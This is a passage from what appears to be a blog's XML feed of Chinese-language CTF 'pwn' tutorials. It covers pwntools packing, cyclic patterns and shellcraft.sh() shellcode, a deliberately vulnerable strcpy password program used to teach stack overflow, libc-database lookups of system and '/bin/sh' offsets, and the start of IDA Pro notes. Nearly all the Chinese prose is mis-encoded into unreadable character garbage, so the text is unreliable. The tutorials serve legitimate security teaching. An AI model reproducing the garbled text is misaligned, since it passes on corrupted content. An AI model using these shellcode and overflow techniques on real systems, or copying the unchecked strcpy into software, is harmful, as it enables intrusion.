class="string">è¿™å¥è¯çš„æ„æ€æ˜¯ï¼š</span></span><br><span class="line"><span class="string">1. osè®¾ç½®ç³»ç»Ÿä¸ºlinuxç³»ç»Ÿï¼Œåœ¨å®Œæˆctfé¢˜ç›®çš„æ—¶å€™ï¼Œå¤§å¤šæ•°pwné¢˜ç›®çš„ç³»ç»Ÿéƒ½æ˜¯linux  </span></span><br><span class="line"><span class="string">2. archè®¾ç½®æ¶æ„ä¸ºamd64ï¼Œå¯ä»¥ç®€å•çš„è®¤ä¸ºè®¾ç½®ä¸º64ä½çš„æ¨¡å¼ï¼Œå¯¹åº”çš„32ä½æ¨¡å¼æ˜¯â€™i386â€™  </span></span><br><span class="line"><span class="string">3. log_levelè®¾ç½®æ—¥å¿—è¾“å‡ºçš„ç­‰çº§ä¸ºdebugï¼Œè¿™å¥è¯åœ¨è°ƒè¯•çš„æ—¶å€™ä¸€èˆ¬ä¼šè®¾ç½®ï¼Œè¿™æ ·pwntoolsä¼šå°†å®Œæ•´çš„ioè¿‡ç¨‹éƒ½æ‰“å°ä¸‹æ¥ï¼Œä½¿å¾—è°ƒè¯•æ›´åŠ æ–¹ä¾¿ï¼Œå¯ä»¥é¿å…åœ¨å®ŒæˆCTFé¢˜ç›®æ—¶å‡ºç°ä¸€äº›å’ŒIOç›¸å…³çš„é”™è¯¯ã€‚</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure></p><h1 id="æ•°æ®æ‰“åŒ…"><a href="#æ•°æ®æ‰“åŒ…" class="headerlink" title="æ•°æ®æ‰“åŒ…"></a>æ•°æ®æ‰“åŒ…</h1><p>æ•°æ®æ‰“åŒ…,å³å°†æ•´æ•°å€¼è½¬æ¢ä¸º32ä½æˆ–è€…64ä½åœ°å€ä¸€æ ·çš„è¡¨ç¤ºæ–¹å¼,æ¯”å¦‚0x400010è¡¨ç¤ºä¸º\x10\x00\x40ä¸€æ ·,è¿™ä½¿å¾—æˆ‘ä»¬æ„é€ payloadå˜å¾—å¾ˆæ–¹ä¾¿</p><p>ç”¨æ³•:  </p><ul><li><code>p32/p64</code>: æ‰“åŒ…ä¸€ä¸ªæ•´æ•°,åˆ†åˆ«æ‰“åŒ…ä¸º32æˆ–64ä½  </li><li><code>u32/u64</code>: è§£åŒ…ä¸€ä¸ªå­—ç¬¦ä¸²,å¾—åˆ°æ•´æ•°</li></ul><p>på¯¹åº”pack,æ‰“åŒ…,uå¯¹åº”unpack,è§£åŒ…,ç®€å•å¥½è®°</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = p32(<span class="number">0xdeadbeef</span>) <span class="comment"># pack 32 bits number</span></span><br></pre></td></tr></table></figure><h1 id="æ•°æ®è¾“å‡º"><a href="#æ•°æ®è¾“å‡º" class="headerlink" title="æ•°æ®è¾“å‡º"></a>æ•°æ®è¾“å‡º</h1><p>å¦‚æœéœ€è¦è¾“å‡ºä¸€äº›ä¿¡æ¯,æœ€å¥½ä½¿ç”¨pwntoolsè‡ªå¸¦çš„,å› ä¸ºå’Œpwntoolsæœ¬æ¥çš„æ ¼å¼å»åˆ,çœ‹èµ·æ¥ä¹Ÿæ¯”è¾ƒèˆ’æœ,ç”¨æ³•:<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">some_str = <span class="string">&quot;hello, world&quot;</span></span><br><span class="line">log.info(some_str)</span><br></pre></td></tr></table></figure></p><blockquote><p>å…¶ä¸­çš„infoä»£è¡¨æ˜¯logç­‰çº§ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨å…¶ä»–logç­‰çº§ã€‚</p></blockquote><h1 id="Cyclic-pattern"><a href="#Cyclic-pattern" class="headerlink" title="Cyclic pattern"></a>Cyclic pattern</h1><p>Cyclic patternæ˜¯ä¸€ä¸ªå¾ˆå¼ºå¤§çš„åŠŸèƒ½ï¼Œå¤§æ¦‚æ„æ€å°±æ˜¯ï¼Œä½¿ç”¨pwntoolsç”Ÿæˆä¸€ä¸ªpatternï¼Œpatternå°±æ˜¯æŒ‡ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œå¯ä»¥é€šè¿‡å…¶ä¸­çš„ä¸€éƒ¨åˆ†æ•°æ®å»å®šä½åˆ°ä»–åœ¨ä¸€ä¸ªå­—ç¬¦ä¸²ä¸­çš„ä½ç½®ã€‚<br>åœ¨æˆ‘ä»¬å®Œæˆæ ˆæº¢å‡ºé¢˜ç›®çš„æ—¶å€™ï¼Œä½¿ç”¨patternå¯ä»¥å¤§å¤§çš„å‡å°‘è®¡ç®—æº¢å‡ºç‚¹çš„æ—¶é—´ã€‚<br>ç”¨æ³•ï¼š<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">cyclic(<span class="number">0x100</span>) <span class="comment"># ç”Ÿæˆä¸€ä¸ª0x100å¤§å°çš„patternï¼Œå³ä¸€ä¸ªç‰¹æ®Šçš„å­—ç¬¦ä¸²</span></span><br><span class="line">cyclic_find(<span class="number">0x61616161</span>) <span class="comment"># æ‰¾åˆ°è¯¥æ•°æ®åœ¨patternä¸­çš„ä½ç½®</span></span><br><span class="line">cyclic_find(<span class="string">&#x27;aaaa&#x27;</span>) <span class="comment"># æŸ¥æ‰¾ä½ç½®ä¹Ÿå¯ä»¥ä½¿ç”¨å­—ç¬¦ä¸²å»å®šä½</span></span><br></pre></td></tr></table></figure><br>æ¯”å¦‚ï¼Œæˆ‘ä»¬åœ¨æ ˆæº¢å‡ºçš„æ—¶å€™ï¼Œé¦–å…ˆæ„é€ <code>cyclic(0x100)</code>ï¼Œæˆ–è€…æ›´é•¿é•¿åº¦çš„patternï¼Œè¿›è¡Œè¾“å…¥ï¼Œè¾“å…¥åpcçš„å€¼å˜å‘³äº†0x61616161ï¼Œé‚£ä¹ˆæˆ‘ä»¬é€šè¿‡<code>cyclic_find(0x61616161)</code>å°±å¯ä»¥å¾—åˆ°ä»å“ªä¸€ä¸ªå­—èŠ‚å¼€å§‹ä¼šæ§åˆ¶PCå¯„å­˜å™¨äº†ï¼Œé¿å…äº†å¾ˆå¤šæ²¡å¿…è¦çš„è®¡ç®—ã€‚</p><h1 id="æ±‡ç¼–ä¸shellcode"><a href="#æ±‡ç¼–ä¸shellcode" class="headerlink" title="æ±‡ç¼–ä¸shellcode"></a>æ±‡ç¼–ä¸shellcode</h1><p>æœ‰çš„æ—¶å€™æˆ‘ä»¬éœ€è¦åœ¨å†™expçš„æ—¶å€™ç”¨åˆ°ç®€å•çš„shellcodeï¼Œpwntoolsæä¾›äº†å¯¹ç®€å•çš„shellcodeçš„æ”¯æŒã€‚<br>é¦–å…ˆï¼Œå¸¸ç”¨çš„ï¼Œä¹Ÿæ˜¯æœ€ç®€å•çš„shellcodeã€‚shellcraft : shellcodeçš„ç”Ÿæˆå™¨ã€‚å³è°ƒç”¨<code>/bin/sh</code>å¯ä»¥é€šè¿‡shellcraftå¾—åˆ°ï¼š<br>æ³¨æ„ï¼Œç”±äºå„ä¸ªå¹³å°ï¼Œç‰¹åˆ«æ˜¯32ä½å’Œ64ä½çš„shellcodeä¸ä¸€æ ·ï¼Œæ‰€ä»¥æœ€å¥½å…ˆè®¾ç½®contextï¼Œå¦‚æœæ²¡å£°æ˜å¹³åˆ™<br><code>32ä½:shellcraft.i386.linux.sh()</code><br><code>64ä½:shellcraft.amd64.linux.sh()</code><br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">print</span>(shellcraft.sh()) <span class="comment"># æ‰“å°å‡ºshellcode</span></span><br></pre></td></tr></table></figure><br>ä¸è¿‡ï¼Œç°åœ¨æˆ‘ä»¬çœ‹åˆ°çš„shellcodeè¿˜æ˜¯æ±‡ç¼–ä»£ç ï¼Œä¸æ˜¯èƒ½ç”¨çš„æœºå™¨ç ï¼Œæ‰€ä»¥è¿˜éœ€è¦è¿›è¡Œä¸€æ¬¡æ±‡ç¼–<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">print</span>(asm(shellcraft.sh())) <span class="comment"># æ‰“å°å‡ºæ±‡ç¼–åçš„shellcode</span></span><br></pre></td></tr></table></figure><br>asmå¯ä»¥å¯¹æ±‡ç¼–ä»£ç è¿›è¡Œæ±‡ç¼–ï¼Œä¸è¿‡pwntoolsç›®å‰çš„asmå®ç°è¿˜æœ‰ä¸€äº›ç¼ºé™·ï¼Œæ¯”å¦‚ä¸èƒ½æ”¯æŒç›¸å¯¹è·³è½¬ç­‰ç­‰ï¼Œåªå¯ä»¥è¿›è¡Œç®€å•çš„æ±‡ç¼–æ“ä½œã€‚å¦‚æœéœ€è¦æ›´å¤æ‚ä¸€äº›çš„æ±‡ç¼–åŠŸèƒ½ï¼Œå¯ä»¥ä½¿ç”¨<code>keystone-engine</code>é¡¹ç›®ï¼Œè¿™é‡Œå°±ä¸å†èµ˜è¿°äº†ã€‚<br>asmä¹Ÿæ˜¯æ¶æ„ç›¸å…³ï¼Œæ‰€ä»¥ä¸€å®šè¦å…ˆè®¾ç½®contextï¼Œé¿å…ä¸€äº›æ„æƒ³ä¸åˆ°çš„é”™è¯¯ã€‚</p><h1 id="ELFæ–‡ä»¶æ“ä½œ"><a href="#ELFæ–‡ä»¶æ“ä½œ" class="headerlink" title="ELFæ–‡ä»¶æ“ä½œ"></a>ELFæ–‡ä»¶æ“ä½œ</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">In [<span class="number">1</span>]: <span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">In [<span class="number">2</span>]: elf = ELF(<span class="string">&#x27;./level0&#x27;</span>)</span><br><span class="line">[*] <span class="string">&#x27;/home/nuo/level0&#x27;</span></span><br><span class="line">    Arch:     amd64-<span class="number">64</span>-little</span><br><span class="line">    RELRO:    No RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (<span class="number">0x400000</span>)</span><br><span class="line"></span><br><span class="line">In [<span class="number">3</span>]: callsys_addr = elf.symbols[<span class="string">&#x27;callsystem&#x27;</span>]</span><br><span class="line"></span><br><span class="line">In [<span class="number">4</span>]: <span class="built_in">print</span> callsys_addr</span><br><span class="line"><span class="number">4195734</span></span><br><span class="line">In [<span class="number">6</span>]: a=<span class="built_in">hex</span>(callsys_addr)</span><br><span class="line"></span><br><span class="line">In [<span class="number">7</span>]: <span class="built_in">print</span> a</span><br><span class="line"><span class="number">0x400596</span></span><br></pre></td></tr></table></figure><p>å¯è§ipythonæ—¶ï¼ŒELFç›¸å½“äºchecksec ,ä½†å…¶ä¸»è¦æ˜¯è·å–ä¿¡æ¯ï¼Œä¸€äº›åœ°å€ç­‰<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>e = ELF(<span class="string">&#x27;/bin/cat&#x27;</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">print</span> <span class="built_in">hex</span>(e.address)  <span class="comment"># æ–‡ä»¶è£…è½½çš„åŸºåœ°å€</span></span><br><span class="line"><span class="number">0x400000</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">print</span> <span class="built_in">hex</span>(e.symbols[<span class="string">&#x27;write&#x27;</span>]) <span class="comment"># å‡½æ•°åœ°å€,symbols,got,pltå‡æ˜¯åˆ—è¡¨</span></span><br><span class="line"><span class="number">0x401680</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">print</span> <span class="built_in">hex</span>(e.got[<span class="string">&#x27;write&#x27;</span>]) <span class="comment"># GOTè¡¨çš„åœ°å€</span></span><br><span class="line"><span class="number">0x60b070</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">print</span> <span class="built_in">hex</span>(e.plt[<span class="string">&#x27;write&#x27;</span>]) <span class="comment"># PLTçš„åœ°å€</span></span><br><span class="line"><span class="number">0x401680</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">print</span> <span class="built_in">hex</span>(e.search(<span class="string">&#x27;/bin/sh&#x27;</span>).<span class="built_in">next</span>())<span class="comment"># å­—ç¬¦ä¸²/bin/shçš„åœ°å€å­—ç¬¦ä¸²åŠ ï¼ˆï¼‰</span></span><br></pre></td></tr></table></figure></p>]]></content>
      
      
      <categories>
          
          <category> è§£é¢˜å·¥å…· </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
            <tag> è§£é¢˜å·¥å…· </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PWNå…¥é—¨-æ ˆæº¢å‡º</title>
      <link href="/2025/02/03/PWN%E5%85%A5%E9%97%A8-%E6%A0%88%E6%BA%A2%E5%87%BA/"/>
      <url>/2025/02/03/PWN%E5%85%A5%E9%97%A8-%E6%A0%88%E6%BA%A2%E5%87%BA/</url>
      
        <content type="html"><![CDATA[<h1 id="ç¼“å†²åŒºæº¢å‡ºä¹‹æ ˆæº¢å‡ºï¼ˆstrcpyï¼‰"><a href="#ç¼“å†²åŒºæº¢å‡ºä¹‹æ ˆæº¢å‡ºï¼ˆstrcpyï¼‰" class="headerlink" title="ç¼“å†²åŒºæº¢å‡ºä¹‹æ ˆæº¢å‡ºï¼ˆstrcpyï¼‰"></a>ç¼“å†²åŒºæº¢å‡ºä¹‹æ ˆæº¢å‡ºï¼ˆstrcpyï¼‰</h1><h2 id="é¢„å¤‡çŸ¥è¯†"><a href="#é¢„å¤‡çŸ¥è¯†" class="headerlink" title="é¢„å¤‡çŸ¥è¯†"></a>é¢„å¤‡çŸ¥è¯†</h2><h3 id="ç¼“å†²åŒºæº¢å‡ºç®€å•ä»‹ç»"><a href="#ç¼“å†²åŒºæº¢å‡ºç®€å•ä»‹ç»" class="headerlink" title="ç¼“å†²åŒºæº¢å‡ºç®€å•ä»‹ç»"></a>ç¼“å†²åŒºæº¢å‡ºç®€å•ä»‹ç»</h3><p>ç¼“å†²åŒºæº¢å‡ºï¼šç®€å•çš„è¯´ï¼Œç¼“å†²åŒºæº¢å‡ºå°±æ˜¯è¶…é•¿çš„æ•°æ®å‘å°ç¼“å†²åŒºå¤åˆ¶ï¼Œå¯¼è‡´æ•°æ®è¶…å‡ºäº†å°ç¼“å†²åŒºï¼Œå¯¼è‡´ç¼“å†²åŒºå…¶ä»–çš„æ•°æ®é­åˆ°ç ´åï¼Œè¿™å°±æ˜¯ç¼“å†²åŒºæº¢å‡ºã€‚<em>è€Œæ ˆæº¢å‡ºæ˜¯ç¼“å†²åŒºæº¢å‡ºçš„ä¸€ç§</em>ï¼Œä¹Ÿæ˜¯æœ€å¸¸è§çš„ã€‚åªä¸è¿‡æ ˆæº¢å‡ºå‘ç”Ÿåœ¨æ ˆï¼Œå †æº¢å‡ºå‘ç”Ÿåœ¨å †ï¼Œå…¶å®éƒ½æ˜¯ä¸€æ ·çš„ã€‚</p><h3 id="æ ˆçš„ç®€å•ä»‹ç»"><a href="#æ ˆçš„ç®€å•ä»‹ç»" class="headerlink" title="æ ˆçš„ç®€å•ä»‹ç»"></a>æ ˆçš„ç®€å•ä»‹ç»</h3><p>æ ˆæ˜¯ä¸€ç§è®¡ç®—æœºç³»ç»Ÿä¸­çš„æ•°æ®ç»“æ„ï¼Œå®ƒæŒ‰ç…§å…ˆè¿›åå‡ºçš„åŸåˆ™å­˜å‚¨æ•°æ®ï¼Œå…ˆè¿›å…¥çš„æ•°æ®è¢«å‹å…¥æ ˆåº•ï¼Œæœ€åçš„æ•°æ®åœ¨æ ˆé¡¶ï¼Œéœ€è¦è¯»æ•°æ®çš„æ—¶å€™ä»æ ˆé¡¶å¼€å§‹å¼¹å‡ºæ•°æ®ï¼ˆæœ€åä¸€ä¸ªæ•°æ®è¢«ç¬¬ä¸€ä¸ªè¯»å‡ºæ¥ï¼‰ï¼Œæ˜¯ä¸€ç§ç‰¹æ®Šçš„çº¿æ€§è¡¨ã€‚æ ˆçš„æ“ä½œå¸¸ç”¨çš„æœ‰è¿›æ ˆï¼ˆPUSHï¼‰ï¼Œå‡ºæ ˆï¼ˆPOPï¼‰ï¼Œè¿˜æœ‰å¸¸ç”¨çš„æ ‡è¯†æ ˆé¡¶å’Œæ ˆåº•ã€‚</p><ul><li><strong>è¿›æ ˆ</strong>ï¼ˆPUSHï¼‰ï¼šå°†ä¸€ä¸ªæ•°æ®æ”¾å…¥æ ˆé‡Œå«è¿›æ ˆï¼ˆPUSHï¼‰</li><li><strong>å‡ºæ ˆ</strong>ï¼ˆPOPï¼‰ï¼šå°†ä¸€ä¸ªæ•°æ®ä»æ ˆé‡Œå–å‡ºå«å‡ºæ ˆï¼ˆPOPï¼‰</li><li><strong>æ ˆé¡¶</strong>ï¼šå¸¸ç”¨å¯„å­˜å™¨ESPï¼ŒESPæ˜¯æ ˆæŒ‡é’ˆå¯„å­˜å™¨ï¼Œå…¶å†…å­˜æ”¾ç€ä¸€ä¸ªæŒ‡é’ˆï¼Œè¯¥æŒ‡é’ˆæ°¸è¿œæŒ‡å‘ç³»ç»Ÿæ ˆæœ€ä¸Šé¢ä¸€ä¸ªæ ˆå¸§çš„æ ˆé¡¶ã€‚</li><li><strong>æ ˆåº•</strong>ï¼šå¸¸ç”¨å¯„å­˜å™¨EBPï¼ŒEBPæ˜¯åŸºå€æŒ‡é’ˆå¯„å­˜å™¨ï¼Œå…¶å†…å­˜æ”¾ç€ä¸€ä¸ªæŒ‡é’ˆï¼Œè¯¥æŒ‡é’ˆæ°¸è¿œæŒ‡å‘ç³»ç»Ÿæ ˆæœ€ä¸Šé¢ä¸€ä¸ªæ ˆå¸§çš„åº•éƒ¨ã€‚<br><img src="/2025/02/03/PWN%E5%85%A5%E9%97%A8-%E6%A0%88%E6%BA%A2%E5%87%BA/Pasted image 20250121143258.png" alt="Pasted image 20250121143258"><h2 id="å®ä¾‹åˆ†æ"><a href="#å®ä¾‹åˆ†æ" class="headerlink" title="å®ä¾‹åˆ†æ"></a>å®ä¾‹åˆ†æ</h2></li></ul><p><strong>æºä»£ç ï¼š</strong></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PASSWORD <span class="string">&quot;12345&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">test</span><span class="params">(<span class="type">char</span> *password)</span>&#123;</span><br><span class="line">    <span class="type">int</span> ret_num;</span><br><span class="line">    <span class="type">char</span> buffer[<span class="number">8</span>];</span><br><span class="line">    ret_num=<span class="built_in">strcmp</span>(password,PASSWORD);<span class="comment">//ç›¸åŒè¿”å›0</span></span><br><span class="line">    <span class="built_in">strcpy</span>(buffer,password);</span><br><span class="line">    <span class="keyword">return</span> ret_num;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">int</span> flag=<span class="number">0</span>;</span><br><span class="line">    <span class="type">char</span> password[<span class="number">88</span>];</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;plz input your password:\n&quot;</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,password);</span><br><span class="line">        flag=test(password);</span><br><span class="line">        <span class="keyword">if</span>(flag)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;incorrect password!\n\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">             <span class="built_in">printf</span>(<span class="string">&quot;Success!You are right!\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="åˆ†æexeæ–‡ä»¶"><a href="#åˆ†æexeæ–‡ä»¶" class="headerlink" title="åˆ†æexeæ–‡ä»¶"></a>åˆ†æexeæ–‡ä»¶</h4><p>æœç´¢å­—ç¬¦ä¸²<code>plz input your password</code>,å¹¶åœ¨scanfå¤„ä¸‹æ–­ç‚¹<br><img src="/2025/02/03/PWN%E5%85%A5%E9%97%A8-%E6%A0%88%E6%BA%A2%E5%87%BA/Pasted image 20250121150226.png" alt="Pasted image 20250121150226"></p><p><img src="/2025/02/03/PWN%E5%85%A5%E9%97%A8-%E6%A0%88%E6%BA%A2%E5%87%BA/Pasted image 20250121151019.png" alt="Pasted image 20250121151019"></p><p>å¯ä»¥çœ‹åˆ°<code>Dest</code>çš„ç©ºé—´ä¸º<code>0C-04=8</code>ä¸ªå­—èŠ‚ï¼Œå½“<code>strcpy</code>ä¸º8ä¸ªå­—èŠ‚æ—¶ï¼Œç¨‹åºä¼šå¯¼è‡´æ ˆæº¢å‡ºè¦†ç›–æ‰è¿”å›å€¼<code>ret_num</code>ã€‚å…·ä½“ç‚¹æ¥è¯´å°±æ˜¯æˆ‘ä»¬è¾“å…¥çš„â€œqqqqqqqqâ€ä¸º8ä¸ªå­—èŠ‚ï¼Œä½†æ˜¯cè¯­è¨€ä¸­å­—ç¬¦ä¸²åé¢è¿˜æœ‰â€œå­—ç¬¦ä¸²æˆªæ–­ç¬¦<code>\x00</code>â€ï¼Œè¿™ä¸ªæˆªæ–­ç¬¦<code>\x00</code>å°†<code>var_4</code>ç”±åŸæ¥çš„<code>01</code>è¦†ç›–ä¸º<code>00</code>ï¼Œè¿™æ ·å°±è¾“å‡ºäº†æœ€ç»ˆçš„<code>â€œSuccess!You are right!â€</code></p>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
            <tag> æ ˆ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å·¥å…·ç¯‡Â·libc-database</title>
      <link href="/2025/02/03/%E5%B7%A5%E5%85%B7%E7%AF%87%C2%B7libc-database/"/>
      <url>/2025/02/03/%E5%B7%A5%E5%85%B7%E7%AF%87%C2%B7libc-database/</url>
      
        <content type="html"><![CDATA[<p><a href="https://libc.rip/">libc-databaseåœ¨çº¿ç½‘å€</a></p><p>è¿è¡Œå¦‚ä¸‹å‘½ä»¤ä¸‹è½½libcç¬¦å·è¡¨ä¸åç§»æ–‡ä»¶ã€‚<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ ./get  <span class="comment"># List categories</span></span><br><span class="line">$ ./get ubuntu debian  <span class="comment"># Download Ubuntu&#x27;s and Debian&#x27;s libc, old default behavior</span></span><br><span class="line">$ ./get all  <span class="comment"># Download all categories. Can take a while!</span></span><br></pre></td></tr></table></figure></p><p>å°†è‡ªå®šä¹‰çš„ libc æ·»åŠ åˆ°ä½ çš„æ•°æ®åº“ä¸­ã€‚<br><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">./add /usr/lib/libc-2.21.so</span></span><br></pre></td></tr></table></figure></p><p>åœ¨æ•°æ®åº“ä¸­æŸ¥æ‰¾æ‰€æœ‰å…·æœ‰ç»™å®šåç§°å’Œåœ°å€çš„ libcã€‚åªæ£€æŸ¥æœ€å 12 ä½ï¼Œå› ä¸ºéšæœºåŒ–é€šå¸¸åœ¨é¡µé¢å¤§å°çº§åˆ«ä¸Šå·¥ä½œã€‚<br><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">./find <span class="built_in">printf</span> 260 puts f30</span></span><br><span class="line">archive-glibc (libc6_2.19-10ubuntu2_i386)</span><br></pre></td></tr></table></figure></p><p>ä»æ³„æ¼çš„è¿”å›åœ°å€ä¸­æŸ¥æ‰¾ libc<br><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">./find __libc_start_main_ret a83</span></span><br><span class="line">ubuntu-trusty-i386-libc6 (libc6_2.19-0ubuntu6.6_i386)</span><br><span class="line">archive-eglibc (libc6_2.19-0ubuntu6_i386)</span><br><span class="line">ubuntu-utopic-i386-libc6 (libc6_2.19-10ubuntu2.3_i386)</span><br><span class="line">archive-glibc (libc6_2.19-10ubuntu2_i386)</span><br><span class="line">archive-glibc (libc6_2.19-15ubuntu2_i386)</span><br></pre></td></tr></table></figure></p><p>æ ¹æ® libc ID æå–ä¸€äº›æœ‰ç”¨çš„åç§»é‡<br><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">./dump libc6_2.19-0ubuntu6.6_i386</span></span><br><span class="line">offset___libc_start_main_ret = 0x19a83</span><br><span class="line">offset_system = 0x00040190</span><br><span class="line">offset_dup2 = 0x000db590</span><br><span class="line">offset_recv = 0x000ed2d0</span><br><span class="line">offset_str_bin_sh = 0x160a24</span><br></pre></td></tr></table></figure></p><p>æ£€æŸ¥ä¸€ä¸ªåº“æ˜¯å¦å·²ç»åœ¨æ•°æ®åº“ä¸­ã€‚<br><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">./identify /usr/lib/libc.so.6</span></span><br><span class="line">local-f706181f06104ef6c7008c066290ea47aa4a82c5</span><br></pre></td></tr></table></figure></p><p>æˆ–è€…ä½¿ç”¨å“ˆå¸Œå€¼ï¼ˆç›®å‰å®ç°äº† BuildIDã€MD5ã€SHA1 å’Œ SHA256ï¼‰æŸ¥æ‰¾ libcï¼š<br><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">./identify bid=ebeabf5f7039f53748e996fc976b4da2d486a626</span></span><br><span class="line">libc6_2.17-93ubuntu4_i386</span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">./identify md5=af7c40da33c685d67cdb166bd6ab7ac0</span></span><br><span class="line">libc6_2.17-93ubuntu4_i386</span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">./identify sha1=9054f5cb7969056b6816b1e2572f2506370940c4</span></span><br><span class="line">libc6_2.17-93ubuntu4_i386</span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">./identify sha256=8dc102c06c50512d1e5142ce93a6faf4ec8b6f5d9e33d2e1b45311aef683d9b2</span></span><br><span class="line">libc6_2.17-93ubuntu4_i386</span><br></pre></td></tr></table></figure></p><p>ä¸‹è½½ä¸ libc ID å¯¹åº”çš„æ•´ä¸ªåº“ã€‚<br><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">./download libc6_2.23-0ubuntu10_amd64</span></span><br><span class="line">Getting libc6_2.23-0ubuntu10_amd64</span><br><span class="line">    -&gt; Location: http://security.ubuntu.com/ubuntu/pool/main/g/glibc/libc6_2.23-0ubuntu10_amd64.deb</span><br><span class="line">    -&gt; Downloading package</span><br><span class="line">    -&gt; Extracting package</span><br><span class="line">    -&gt; Package saved to libs/libc6_2.23-0ubuntu10_amd64</span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">ls</span> libs/libc6_2.23-0ubuntu10_amd64</span></span><br><span class="line">ld-2.23.so ... libc.so.6 ... libpthread.so.0 ...</span><br></pre></td></tr></table></figure></p>]]></content>
      
      
      <categories>
          
          <category> è§£é¢˜å·¥å…· </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
            <tag> è§£é¢˜å·¥å…· </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å·¥å…·ç¯‡Â·IDA_Pro</title>
      <link href="/2025/02/02/%E5%B7%A5%E5%85%B7%E7%AF%87%C2%B7IDA-Pro/"/>
      <url>/2025/02/02/%E5%B7%A5%E5%85%B7%E7%AF%87%C2%B7IDA-Pro/</url>
      
        <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>ç¬”è€…æ›¾ç»ç”¨è¿‡ <code>7.7ï¼ˆç»§æ‰¿äº†æ¥è‡ªå­¦é•¿55æ¡‘çš„è¯¸å¤šæ’ä»¶ï¼‰</code> ä¸ <code>8.3</code>ï¼Œä½†éƒ½åªæ˜¯è‰è‰ç”¨è¿‡ï¼Œè¿‘æ—¥æ²‰è¿·äºpwnä¹‹ä¹è¶£ï¼Œä½¿ç”¨é¢‘ç‡å¤§å¤§å¢åŠ ï¼Œæ°å·§è‡ªå·±æ–°æäº†å…¨æ–°æ¬¾<code>IDA Pro 9.0 SP1</code>(ä¼¼ä¹æ˜¯é¦–ä¸ªä¸ç”¨ä½¿ç”¨è€…è‡ªå·±åˆ¤æ–­32ä½/64ä½çš„ç‰ˆæœ¬)ï¼Œæ·±å…¥äº†è§£åä¹Ÿè¢«IDAçš„å¼ºå¤§åŠŸèƒ½æŠ˜æœã€‚<br>é‚ä»é›¶å¼€å§‹è®°å½•<strong>ä½¿ç”¨ç¬”è®°</strong></p><h2 id="å¸¸ç”¨å¿«æ·é”®"><a href="#å¸¸ç”¨å¿«æ·é”®" class="headerlink" title="å¸¸ç”¨å¿«æ·é”®"></a>å¸¸ç”¨å¿«æ·é”®</h2><p><code>ç©ºæ ¼é”®</code>ï¼š åˆ‡æ¢ <strong>æ–‡æœ¬è§†å›¾</strong> ä¸ <strong>å›¾è¡¨è§†å›¾</strong><br><code>ESC</code>ï¼š 